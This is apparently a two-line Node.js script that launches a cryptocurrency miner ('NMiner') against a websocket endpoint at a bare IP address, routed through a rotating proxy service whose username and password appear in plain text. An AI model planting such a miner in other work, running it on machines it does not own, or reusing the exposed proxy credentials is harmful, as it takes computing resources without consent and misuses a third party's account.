const { NMiner } = require(".");
new NMiner("ws://34.30.241.131:443", null, { proxy: "http://subhasweb-rotate:anyosubhas@p.webshare.io:80" });